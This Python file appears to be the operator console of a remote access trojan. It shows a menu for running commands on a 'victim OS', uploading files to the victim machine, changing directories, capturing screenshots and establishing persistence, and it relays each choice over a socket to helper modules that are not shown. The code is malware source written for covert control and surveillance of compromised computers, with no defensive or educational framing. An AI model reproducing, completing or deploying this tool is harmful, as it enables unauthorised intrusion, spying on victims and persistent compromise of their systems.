from command import run_command
from fileupload import upload_files
from file_folder_downlaod import receive_file_folders
from screenshot import capture_screenshot
from persistance import become_persistent

def show_options():
    print("\n")
    print("\t\t[ 01 ] Run Command on victim OS")
    print("\t\t[ 02 ] Upload File to the victim machine ")
    print("\t\t[ 03 ] Change Dir")
    print("\t\t[ 04 ] Take a screenshot of the victim machine")
    print("\t\t[ 05 ] Become persistent")
    print("\t\t[ 99 ] Exit")
    print("\n")

def handleConnection(my_socket):
    print ("[+] Handling connection")

    while True:
       show_options()
       user_input = input ("[+] Select your options: ")

       my_socket.send_data(user_input)

       if user_input == "1":
           print("[+] Running the system commands on victim")
           run_command(my_socket)

       
       elif user_input == "99":
           break

       elif user_input == "2":
           #UPLOAD FILES
           print("[+] Upload files") 
           upload_files(my_socket)

       elif user_input == "3":
           #CHANGE DIRECTORY
           my_socket.change_dir()

       elif user_input == "4":
           #Take SS
           capture_screenshot(my_socket)
        
       elif user_input == "5":
           become_persistent(my_socket)

       else:
            print("[+] Invalid input")
           

        

